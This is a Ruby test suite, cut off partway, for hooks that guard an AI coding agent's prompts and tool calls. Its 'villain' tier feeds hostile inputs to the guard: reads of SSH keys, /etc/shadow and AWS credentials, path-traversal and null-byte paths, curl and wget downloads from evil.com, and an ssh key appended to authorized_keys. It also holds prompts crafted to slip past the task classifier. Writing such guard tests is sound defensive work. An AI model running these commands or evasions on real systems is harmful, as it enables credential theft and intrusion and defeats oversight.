#!/usr/bin/env ruby
# frozen_string_literal: true

# Tier Tests: Easy, Hard, Villain
# Tests ACTUAL hook behavior, not just helper functions
#
# Run: ruby scripts/hooks/test/tier_tests.rb

require 'json'
require 'open3'
require 'fileutils'

HOOKS_DIR = File.expand_path('..', __dir__)
PROJECT_DIR = File.expand_path('../..', HOOKS_DIR)

# === TEST FRAMEWORK ===

class TierTest
  PASS = '✅'
  FAIL = '❌'
  SKIP = '⏭️'
  WEAK = '⚠️'

  attr_reader :passed, :failed, :skipped, :weak, :results

  # hook_default_exit: the exit code a hook returns when doing nothing special.
  # For most hooks this is 0. Tests that only check this value are "weak".
  def initialize(hook_name, hook_default_exit: 0)
    @hook_name = hook_name
    @hook_default_exit = hook_default_exit
    @passed = 0
    @failed = 0
    @skipped = 0
    @weak = 0
    @results = { easy: [], hard: [], villain: [] }
  end

  def run_hook(stdin_data, env = {})
    hook_path = File.join(HOOKS_DIR, "#{@hook_name}.rb")
    env_with_defaults = {
      'CLAUDE_PROJECT_DIR' => PROJECT_DIR,
      'TIER_TEST_MODE' => 'true'  # Hooks can detect test mode
    }.merge(env)

    stdout, stderr, status = Open3.capture3(
      env_with_defaults,
      'ruby', hook_path,
      stdin_data: stdin_data.to_json
    )

    {
      stdout: stdout,
      stderr: stderr,
      exit_code: status.exitstatus,
      output: stdout + stderr
    }
  end

  def test(tier, name, expected_exit: nil, expected_output: nil, expected_not_output: nil, state_check: nil, skip: false)
    if skip
      @skipped += 1
      @results[tier] << { name: name, status: :skipped, reason: 'Marked skip' }
      warn "  #{SKIP} #{name} (skipped)"
      return
    end

    result = yield

    passed = true
    failure_reason = nil

    if expected_exit && result[:exit_code] != expected_exit
      passed = false
      failure_reason = "Expected exit #{expected_exit}, got #{result[:exit_code]}"
    end

    if expected_output && !result[:output].include?(expected_output)
      passed = false
      failure_reason = "Expected output containing '#{expected_output}'"
    end

    if expected_not_output && result[:output].include?(expected_not_output)
      passed = false
      failure_reason = "Expected output NOT containing '#{expected_not_output}'"
    end

    if state_check
      begin
        unless state_check.call
          passed = false
          failure_reason = 'State check failed'
        end
      rescue StandardError => e
        passed = false
        failure_reason = "State check error: #{e.message}"
      end
    end

    if passed
      # Classify assertion strength: weak if only checking default exit
      has_real_assertion = !expected_output.nil? ||
                           !expected_not_output.nil? ||
                           !state_check.nil? ||
                           (expected_exit && expected_exit != @hook_default_exit)

      if has_real_assertion
        @passed += 1
        @results[tier] << { name: name, status: :passed }
        warn "  #{PASS} #{name}"
      else
        @weak += 1
        @results[tier] << { name: name, status: :weak }
        warn "  #{WEAK} #{name} (weak — only checks default exit)"
      end
    else
      @failed += 1
      @results[tier] << { name: name, status: :failed, reason: failure_reason }
      warn "  #{FAIL} #{name}"
      warn "      #{failure_reason}" if failure_reason
    end
  end

  def summary
    easy = @results[:easy].count { |r| r[:status] == :passed }
    hard = @results[:hard].count { |r| r[:status] == :passed }
    villain = @results[:villain].count { |r| r[:status] == :passed }

    easy_weak = @results[:easy].count { |r| r[:status] == :weak }
    hard_weak = @results[:hard].count { |r| r[:status] == :weak }
    villain_weak = @results[:villain].count { |r| r[:status] == :weak }

    easy_total = @results[:easy].length
    hard_total = @results[:hard].length
    villain_total = @results[:villain].length

    weak_note = @weak > 0 ? " (#{@weak} weak)" : ''
    warn "  #{@hook_name}: #{@passed} passed, #{@failed} failed, #{@weak} weak#{@skipped > 0 ? ", #{@skipped} skipped" : ''}"

    {
      hook: @hook_name,
      passed: @passed,
      failed: @failed,
      skipped: @skipped,
      weak: @weak,
      total: @passed + @failed + @skipped + @weak,
      by_tier: {
        easy: "#{easy}/#{easy_total}#{easy_weak > 0 ? " (#{easy_weak}w)" : ''}",
        hard: "#{hard}/#{hard_total}#{hard_weak > 0 ? " (#{hard_weak}w)" : ''}",
        villain: "#{villain}/#{villain_total}#{villain_weak > 0 ? " (#{villain_weak}w)" : ''}"
      }
    }
  end
end

# === SANEPROMPT TESTS ===

def test_saneprompt
  t = TierTest.new('saneprompt')
  warn "\n=== SANEPROMPT TESTS ==="

  # --- EASY TIER ---
  warn "\n  [EASY] Basic classification"

  # Passthrough tests — verify NO task output (passthroughs should be silent)
  %w[y yes Y Yes n no ok OK /commit /help 123 done].each do |input|
    t.test(:easy, "passthrough: '#{input}'", expected_exit: 0,
           expected_not_output: 'SanePrompt:') do
      t.run_hook({ 'prompt' => input })
    end
  end

  # Question tests — verify NO task output (questions should be silent)
  [
    'what does this do?',
    'how does it work?',
    'is this correct?',
    'can you explain?',
    'why is this failing?',
    'where is the config?',
    'when was this added?',
    'who wrote this code?'
  ].each do |input|
    t.test(:easy, "question: '#{input[0..30]}'", expected_exit: 0,
           expected_not_output: 'SanePrompt:') do
      t.run_hook({ 'prompt' => input })
    end
  end

  # --- HARD TIER ---
  warn "\n  [HARD] Edge cases and ambiguity"

  # Big task classification — verify BIG TASK output
  [
    'fix everything in the module',
    'refactor the whole thing',
    'rewrite entire system',
    'overhaul all tests'
  ].each do |input|
    t.test(:hard, "big_task: '#{input[0..35]}'", expected_exit: 0,
           expected_output: 'SanePrompt: BIG TASK') do
      t.run_hook({ 'prompt' => input })
    end
  end

  # Mixed patterns — "fix" keyword present but question semantics
  # Note: "quick question about the fix" has no ? and no question-start word,
  # so classify_prompt falls through to TASK_INDICATOR (matches "fix") → classified as task
  t.test(:hard, "task despite question intent: 'quick question about the fix'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'quick question about the fix' })
  end

  # "what was the update?" starts with "what" → matches QUESTION_PATTERN first → question
  t.test(:hard, "question despite 'update': 'what was the update?'", expected_exit: 0,
         expected_not_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'what was the update?' })
  end

  # Question mark + question-start word → QUESTION_PATTERN wins over TASK_INDICATOR
  t.test(:hard, "question wins: 'can you fix this?'", expected_exit: 0,
         expected_not_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'can you fix this?' })
  end

  # "would you update the file?" matches QUESTION_PATTERN third branch
  t.test(:hard, "question wins: 'would you update the file?'", expected_exit: 0,
         expected_not_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'would you update the file?' })
  end

  # Frustration detection — should emit frustration warning
  t.test(:hard, "frustration: 'no, I meant fix it differently'", expected_exit: 0,
         expected_output: 'Frustration detected') do
    t.run_hook({ 'prompt' => 'no, I meant fix it differently' })
  end

  t.test(:hard, "frustration: 'I already said fix the login'", expected_exit: 0,
         expected_output: 'Frustration detected') do
    t.run_hook({ 'prompt' => 'I already said fix the login' })
  end

  t.test(:hard, "frustration: 'JUST FIX IT ALREADY'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'JUST FIX IT ALREADY' })
  end

  # "this is wrong again" — no explicit frustration keywords (no "no,", "already said", caps)
  # It does have "wrong" but that alone doesn't trigger frustration detection
  t.test(:hard, "not-frustration: 'this is wrong again'", expected_exit: 0,
         expected_not_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'this is wrong again' })
  end

  # Trigger detection — should emit pattern triggers warning
  %w[quick just simple minor].each do |trigger|
    t.test(:hard, "trigger detected: '#{trigger} fix'", expected_exit: 0,
           expected_output: 'Pattern triggers detected') do
      t.run_hook({ 'prompt' => "#{trigger} fix for the button" })
    end
  end

  # Multiple triggers — verify triggers fire
  t.test(:hard, "multi-trigger: 'just add a quick simple fix'", expected_exit: 0,
         expected_output: 'Pattern triggers detected') do
    t.run_hook({ 'prompt' => 'just add a quick simple fix' })
  end

  t.test(:hard, "multi-trigger: 'tiny quick minor update'", expected_exit: 0,
         expected_output: 'Pattern triggers detected') do
    t.run_hook({ 'prompt' => 'tiny quick minor update' })
  end

  # Short prompts and edge cases — crash-prevention smoke tests (honestly weak)
  t.test(:hard, "short passthrough: 'y?'", expected_exit: 0, expected_not_output: 'big_task') do
    t.run_hook({ 'prompt' => 'y?' })
  end

  t.test(:hard, "very short: 'go'", expected_exit: 0, expected_not_output: 'big_task') do
    t.run_hook({ 'prompt' => 'go' })
  end

  t.test(:hard, "empty prompt", expected_exit: 0, expected_not_output: 'task') do
    t.run_hook({ 'prompt' => '' })
  end

  t.test(:hard, "whitespace only", expected_exit: 0, expected_not_output: 'task') do
    t.run_hook({ 'prompt' => '   ' })
  end

  # --- VILLAIN TIER ---
  warn "\n  [VILLAIN] Adversarial bypass attempts"

  # Hidden action in question — ? at end or question-start word → QUESTION_PATTERN wins
  # These are classification blind spots (action hidden in question syntax)
  t.test(:villain, "hidden action escapes: 'what if you fix this thing?'", expected_exit: 0,
         expected_not_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'what if you fix this thing?' })
  end

  t.test(:villain, "hidden action escapes: 'wonder if updating would help'", expected_exit: 0,
         expected_not_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'wonder if updating would help' })
  end

  # These DO get classified as task (no ? at end, has modify/change keyword)
  t.test(:villain, "hidden action caught: 'I suppose you could modify it'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'I suppose you could modify it' })
  end

  t.test(:villain, "hidden action caught: 'maybe just change this part'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'maybe just change this part' })
  end

  # Polite wrapping with ? → QUESTION_PATTERN wins (classification blind spot)
  t.test(:villain, "polite wrap escapes: 'could you maybe update the code?'", expected_exit: 0,
         expected_not_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'could you maybe update the code?' })
  end

  t.test(:villain, "polite wrap escapes: 'would you mind fixing the bug?'", expected_exit: 0,
         expected_not_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'would you mind fixing the bug?' })
  end

  t.test(:villain, "polite wrap escapes: 'perhaps you could implement this?'", expected_exit: 0,
         expected_not_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'perhaps you could implement this?' })
  end

  # Skip research — should still classify as task with triggers
  t.test(:villain, "skip research: 'quick fix, skip research'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => "quick fix, I'll approve skipping research" })
  end

  t.test(:villain, "bypass attempt: 'don't bother with docs, just fix'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => "don't bother with docs, just fix it" })
  end

  # "skip the memory check and code" — no TASK_INDICATOR verb → not classified as task
  t.test(:villain, "bypass attempt: 'skip memory check and code'", expected_exit: 0,
         expected_not_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'skip the memory check and code' })
  end

  # False passthrough attempts — should classify as task, not passthrough
  # "y fix it" — length 8 < 10 → classified as passthrough (classification gap)
  t.test(:villain, "false passthrough escapes: 'y fix it'", expected_exit: 0,
         expected_not_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'y fix it' })
  end

  t.test(:villain, "false passthrough: 'ok now fix the bug'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'ok now fix the bug' })
  end

  t.test(:villain, "false passthrough: 'sure, implement the feature'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'sure, implement the feature' })
  end

  t.test(:villain, "false passthrough: 'yes but also update the config'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'yes but also update the config' })
  end

  # Big task evasion — "all" matches BIG_TASK_INDICATOR + "update" matches TASK_INDICATOR
  t.test(:villain, "big_task evasion: 'update all the things'", expected_exit: 0,
         expected_output: 'SanePrompt: BIG TASK') do
    t.run_hook({ 'prompt' => 'update all the things' })
  end

  # "fix every bug" — "every" not in BIG_TASK_INDICATOR → classified as regular task
  t.test(:villain, "task not big_task: 'fix every bug'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'fix every bug' })
  end

  # "migrate everything" — "migrate" not in TASK_INDICATOR → not classified as task
  # "everything" matches BIG_TASK_INDICATOR but classify_prompt checks task first
  t.test(:villain, "escapes classification: 'migrate everything'", expected_exit: 0,
         expected_not_output: 'SanePrompt:') do
    t.run_hook({ 'prompt' => 'migrate everything' })
  end

  # "refactor the entire codebase" — "refactor" in TASK_INDICATOR + "entire" in BIG_TASK_INDICATOR
  t.test(:villain, "big_task evasion: 'refactor the entire codebase'", expected_exit: 0,
         expected_output: 'SanePrompt: BIG TASK') do
    t.run_hook({ 'prompt' => 'refactor the entire codebase' })
  end

  # Hedged and passive — should classify as task
  t.test(:villain, "hedged: 'thinking about maybe adding a feature'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'thinking about maybe adding a feature' })
  end

  t.test(:villain, "passive: 'the fix should be simple'", expected_exit: 0,
         expected_output: 'SanePrompt: TASK') do
    t.run_hook({ 'prompt' => 'the fix should be simple' })
  end

  t.summary
end

# === SANETOOLS TESTS ===

def test_sanetools
  t = TierTest.new('sanetools')
  warn "\n=== SANETOOLS TESTS ==="

  # --- EASY TIER (20 tests) ---
  warn "\n  [EASY] Obvious blocking/allowing"

  # Blocked paths (10)
  [
    '~/.ssh/id_rsa',
    '~/.ssh/config',
    '/etc/passwd',
    '/etc/shadow',
    '~/.aws/credentials',
    '~/.aws/config',
    '~/.claude_hook_secret',
    '~/.netrc',
    '/var/log/system.log',
    '/usr/bin/ruby'
  ].each do |path|
    t.test(:easy, "BLOCK: #{path}", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => path }
      })
    end
  end

  # Allowed bootstrap tools (10) — verify NOT blocked
  t.test(:easy, "ALLOW: Read (bootstrap)", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' }
    })
  end

  t.test(:easy, "ALLOW: Grep (bootstrap)", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Grep',
      'tool_input' => { 'pattern' => 'test' }
    })
  end

  t.test(:easy, "ALLOW: Glob (bootstrap)", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Glob',
      'tool_input' => { 'pattern' => '*.rb' }
    })
  end

  t.test(:easy, "ALLOW: memory MCP read", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'mcp__memory__read_graph',
      'tool_input' => {}
    })
  end

  t.test(:easy, "ALLOW: memory MCP search", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'mcp__memory__search_nodes',
      'tool_input' => { 'query' => 'test' }
    })
  end

  t.test(:easy, "ALLOW: Task agent", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Task',
      'tool_input' => { 'prompt' => 'search for patterns' }
    })
  end

  t.test(:easy, "ALLOW: WebSearch", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'WebSearch',
      'tool_input' => { 'query' => 'swift patterns' }
    })
  end

  t.test(:easy, "ALLOW: WebFetch", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'WebFetch',
      'tool_input' => { 'url' => 'https://example.com' }
    })
  end

  t.test(:easy, "ALLOW: apple-docs MCP", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'mcp__apple-docs__search_apple_docs',
      'tool_input' => { 'query' => 'SwiftUI' }
    })
  end

  t.test(:easy, "ALLOW: context7 MCP", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'mcp__context7__query-docs',
      'tool_input' => { 'libraryId' => '/test/lib', 'query' => 'usage' }
    })
  end

  # --- HARD TIER (15 tests) ---
  warn "\n  [HARD] Edge cases"

  # Path edge cases - directories (5)
  t.test(:hard, "BLOCK: '/etc' (dir itself)", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/etc' }
    })
  end

  t.test(:hard, "BLOCK: '~/.ssh' (dir)", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '~/.ssh' }
    })
  end

  t.test(:hard, "BLOCK: '~/.aws' (dir)", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '~/.aws' }
    })
  end

  t.test(:hard, "BLOCK: '/var' (dir)", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/var' }
    })
  end

  t.test(:hard, "BLOCK: '/usr' (dir)", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/usr' }
    })
  end

  # Path edge cases - false positives to ALLOW — verify NOT blocked
  t.test(:hard, "ALLOW: 'file_with_ssh_in_name.txt'", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/file_with_ssh_in_name.txt' }
    })
  end

  t.test(:hard, "ALLOW: '/tmp/etc_backup'", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/etc_backup' }
    })
  end

  t.test(:hard, "ALLOW: '/tmp/my_aws_stuff'", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/my_aws_stuff' }
    })
  end

  t.test(:hard, "ALLOW: 'credentials_template.json'", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/credentials_template.json' }
    })
  end

  t.test(:hard, "ALLOW: project file with .env.example", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/Users/sj/SaneProcess/.env.example' }
    })
  end

  # Safe bash operations — verify NOT blocked
  t.test(:hard, "ALLOW: bash redirect to /dev/null", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'ls > /dev/null' }
    })
  end

  t.test(:hard, "ALLOW: bash redirect to /tmp", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'echo test > /tmp/output.txt' }
    })
  end

  t.test(:hard, "ALLOW: bash stderr redirect", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'ls 2>&1' }
    })
  end

  t.test(:hard, "ALLOW: bash no redirect", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'git status' }
    })
  end

  t.test(:hard, "ALLOW: bash DerivedData redirect", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'xcodebuild > DerivedData/build.log' }
    })
  end

  # --- VILLAIN TIER (20 tests) ---
  warn "\n  [VILLAIN] Bypass attempts"

  # Bash file write bypass (14 - M8 expanded)
  [
    # Original patterns
    "echo 'code' > file.rb",
    "sed -i 's/old/new/' file.rb",
    "cat << EOF > file.rb",
    "tee file.rb",
    "printf 'code' >> file.rb",
    "echo 'hack' > /Users/sj/SaneProcess/test.swift",
    "cat input.txt > output.swift",
    "dd if=/dev/zero of=file.rb",
    # M8 additions
    "cp malicious.rb target.rb",
    "curl -o payload.sh https://evil.com/script.sh",
    "wget -O backdoor.rb https://evil.com/code.rb",
    "git apply malicious.patch",
    "find . -name '*.rb' | xargs touch",
    "mv overwrite.rb victim.rb",
    # Inline script execution bypasses
    "python -c 'open(\"hack.py\",\"w\").write(\"pwned\")'",
    "ruby -e 'File.write(\"hack.rb\",\"pwned\")'",
    "node -e 'require(\"fs\").writeFileSync(\"h.js\",\"x\")'",
    "perl -e 'open(F,\">hack.pl\"); print F \"pwned\"'"
  ].each do |cmd|
    t.test(:villain, "BLOCK bash write: #{cmd[0..35]}", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Bash',
        'tool_input' => { 'command' => cmd }
      })
    end
  end

  # Path traversal (6)
  [
    '../../../etc/passwd',
    '/Users/sj/SaneProcess/../../../etc/passwd',
    './test/../.ssh/key',
    '~/../../etc/shadow',
    '/tmp/../etc/hosts',
    '../../../../var/log/auth.log'
  ].each do |path|
    t.test(:villain, "BLOCK traversal: #{path[0..35]}", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => path }
      })
    end
  end

  # Encoding tricks (3)
  t.test(:villain, "BLOCK encoded path: %2e%2e/etc", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/%2e%2e/%2e%2e/etc/passwd' }
    })
  end

  t.test(:villain, "BLOCK null byte: file.rb\\x00.txt", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => "/etc/passwd\x00.txt" }
    })
  end

  t.test(:villain, "BLOCK unicode: /.ssh with lookalike", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '~/.ssh/id_rsa' }
    })
  end

  # Combined attacks (3)
  t.test(:villain, "BLOCK write to sensitive via bash", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys' }
    })
  end

  t.test(:villain, "BLOCK sed on config file", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => "sed -i 's/password/hacked/' config.rb" }
    })
  end

  t.test(:villain, "BLOCK tee to source file", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'echo "malicious" | tee app.swift' }
    })
  end

  # SaneLoop enforcement test
  t.test(:villain, "BLOCK edit without saneloop for big task", expected_exit: 2) do
    # Set up state: is_big_task = true, saneloop.active = false
    require_relative '../core/state_manager'
    StateManager.update(:requirements) { |r| r[:is_big_task] = true; r }
    StateManager.update(:saneloop) { |s| s[:active] = false; s }

    result = t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => { 'file_path' => '/tmp/test.rb', 'old_string' => 'a', 'new_string' => 'b' }
    })

    # Clean up state
    StateManager.update(:requirements) { |r| r[:is_big_task] = false; r }

    result
  end

  t.summary
end

# === SANETRACK TESTS ===

def test_sanetrack
  t = TierTest.new('sanetrack')
  warn "\n=== SANETRACK TESTS ==="

  # --- EASY TIER ---
  # Note: PostToolUse always exits 0. Tests must verify side effects via stderr output.
  warn "\n  [EASY] Basic tracking (smoke tests — verify no crash)"

  # Research category tracking — these use correct tool_response key
  # Smoke tests: verify the hook processes these without error
  t.test(:easy, "tracks local: Read", expected_exit: 0,
         expected_not_output: 'RESEARCH INVALIDATED') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' },
      'tool_response' => { 'result' => 'file content here' }
    })
  end

  t.test(:easy, "tracks local: Grep", expected_exit: 0,
         expected_not_output: 'RESEARCH INVALIDATED') do
    t.run_hook({
      'tool_name' => 'Grep',
      'tool_input' => { 'pattern' => 'test' },
      'tool_response' => { 'result' => 'test.rb:50: match' }
    })
  end

  t.test(:easy, "tracks local: Glob", expected_exit: 0,
         expected_not_output: 'RESEARCH INVALIDATED') do
    t.run_hook({
      'tool_name' => 'Glob',
      'tool_input' => { 'pattern' => '*.swift' },
      'tool_response' => { 'result' => 'file1.swift file2.swift' }
    })
  end

  t.test(:easy, "tracks web: WebSearch", expected_exit: 0,
         expected_not_output: 'RESEARCH INVALIDATED') do
    t.run_hook({
      'tool_name' => 'WebSearch',
      'tool_input' => { 'query' => 'test' },
      'tool_response' => { 'result' => 'search results' }
    })
  end

  t.test(:easy, "tracks web: WebFetch", expected_exit: 0,
         expected_not_output: 'error') do
    t.run_hook({
      'tool_name' => 'WebFetch',
      'tool_input' => { 'url' => 'https://example.com' },
      'tool_response' => { 'result' => 'page content' }
    })
  end

  t.test(:easy, "tracks docs: apple-docs MCP", expected_exit: 0,
         expected_not_output: 'error') do
    t.run_hook({
      'tool_name' => 'mcp__apple-docs__search_apple_docs',
      'tool_input' => { 'query' => 'SwiftUI' },
      'tool_response' => { 'result' => 'documentation' }
    })
  end

  t.test(:easy, "tracks docs: context7 MCP", expected_exit: 0,
         expected_not_output: 'error') do
    t.run_hook({
      'tool_name' => 'mcp__context7__query-docs',
      'tool_input' => { 'libraryId' => '/test', 'query' => 'api' },
      'tool_response' => { 'result' => 'documentation' }
    })
  end

  t.test(:easy, "tracks github: mcp__github__search", expected_exit: 0,
         expected_not_output: 'error') do
    t.run_hook({
      'tool_name' => 'mcp__github__search_repositories',
      'tool_input' => { 'query' => 'test' },
      'tool_response' => { 'result' => 'repositories' }
    })
  end

  # Failure detection — verify rewind reminder fires on error
  t.test(:easy, "detects Bash failure via stderr", expected_exit: 0,
         expected_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'false' },
      'tool_response' => { 'stderr' => 'bash: false: command not found' }
    })
  end

  # Success — verify NO rewind reminder
  t.test(:easy, "detects success: no rewind", expected_exit: 0,
         expected_not_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'true' },
      'tool_response' => {}
    })
  end

  t.test(:easy, "detects Edit success", expected_exit: 0,
         expected_not_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => { 'file_path' => '/tmp/test.rb' },
      'tool_response' => {}
    })
  end

  t.test(:easy, "detects Read success", expected_exit: 0,
         expected_not_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' },
      'tool_response' => { 'result' => 'contents' }
    })
  end

  t.test(:easy, "tracks Task agent", expected_exit: 0,
         expected_not_output: 'error') do
    t.run_hook({
      'tool_name' => 'Task',
      'tool_input' => { 'prompt' => 'search codebase' },
      'tool_response' => { 'result' => 'found patterns' }
    })
  end

  # --- HARD TIER ---
  warn "\n  [HARD] Edge cases"

  # Tautology detection — verify RULE #7 WARNING fires
  t.test(:hard, "tautology: self-comparison x == x", expected_exit: 0,
         expected_output: 'RULE #7 WARNING') do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => {
        'file_path' => '/tmp/MyTests.swift',
        'new_string' => '#expect(value == value)'
      },
      'tool_response' => {}
    })
  end

  t.test(:hard, "tautology: count >= 0 always true", expected_exit: 0,
         expected_output: 'RULE #7 WARNING') do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => {
        'file_path' => '/tmp/MyTests.swift',
        'new_string' => '#expect(array.count >= 0)'
      },
      'tool_response' => {}
    })
  end

  t.test(:hard, "tautology: empty assertion", expected_exit: 0,
         expected_output: 'RULE #7 WARNING') do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => {
        'file_path' => '/tmp/MyTests.swift',
        'new_string' => '#expect()'
      },
      'tool_response' => {}
    })
  end

  t.test(:hard, "tautology: XCTAssertEqual self", expected_exit: 0,
         expected_output: 'RULE #7 WARNING') do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => {
        'file_path' => '/tmp/MyTests.swift',
        'new_string' => 'XCTAssertEqual(result, result)'
      },
      'tool_response' => {}
    })
  end

  # Valid assertion — verify NO tautology warning
  t.test(:hard, "NOT tautology: valid assertion", expected_exit: 0,
         expected_not_output: 'RULE #7 WARNING') do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => {
        'file_path' => '/tmp/MyTests.swift',
        'new_string' => '#expect(result.count == 3)'
      },
      'tool_response' => {}
    })
  end

  # False positive avoidance — file CONTENT with error words should NOT trigger failure
  t.test(:hard, "NOT failure: Read file containing 'error'", expected_exit: 0,
         expected_not_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' },
      'tool_response' => { 'result' => 'This file contains the word error but is not a failure' }
    })
  end

  t.test(:hard, "NOT failure: Grep for 'fail'", expected_exit: 0,
         expected_not_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Grep',
      'tool_input' => { 'pattern' => 'fail' },
      'tool_response' => { 'result' => 'failure_handler.rb:50' }
    })
  end

  t.test(:hard, "NOT failure: Read crash log", expected_exit: 0,
         expected_not_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/crash.log' },
      'tool_response' => { 'result' => 'Exception: NullPointerException at line 50' }
    })
  end

  t.test(:hard, "NOT failure: Grep error patterns", expected_exit: 0,
         expected_not_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Grep',
      'tool_input' => { 'pattern' => 'command not found' },
      'tool_response' => { 'result' => 'docs/errors.md:50: handle command not found' }
    })
  end

  t.test(:hard, "NOT failure: file has exit code in content", expected_exit: 0,
         expected_not_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' },
      'tool_response' => { 'result' => 'exit code 1 means failure' }
    })
  end

  # Error signature detection — verify stderr error text triggers failure path
  t.test(:hard, "error signature: COMMAND_NOT_FOUND", expected_exit: 0,
